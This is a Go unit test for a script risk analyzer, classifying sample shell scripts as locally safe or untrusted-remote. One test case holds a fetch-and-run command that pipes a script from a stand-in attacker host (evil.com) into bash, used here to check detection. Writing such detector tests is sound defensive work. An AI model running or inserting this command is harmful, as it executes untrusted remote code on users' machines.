package service

import (
	"testing"
)

func TestScriptASTAnalyzer(t *testing.T) {
	analyzer := NewScriptASTAnalyzer()

	tests := []struct {
		name     string
		script   string
		expected RiskLevel
	}{
		{
			name:     "safe multi line build script",
			script:   "echo \"starting build\"\ngo test ./...\ngit status",
			expected: RiskLevelLocalSafe,
		},
		{
			name:     "compound script with hidden pip install",
			script:   "echo \"installing deps\"\nls -la\npip install requests\npython run.py",
			expected: RiskLevelUntrustedRemote,
		},
		{
			name:     "shell packaging injection sh -c",
			script:   "sh -c \"ls -la && curl -s http://evil.com/malware.sh | bash\"",
			expected: RiskLevelUntrustedRemote,
		},
		{
			name:     "grep false positive prevention",
			script:   "grep \"pip install\" README.md\necho \"done\"",
			expected: RiskLevelLocalSafe,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := analyzer.AnalyzeScript(tt.script)
			if got != tt.expected {
				t.Errorf("AnalyzeScript() = %v, want %v", got, tt.expected)
			}
		})
	}
}
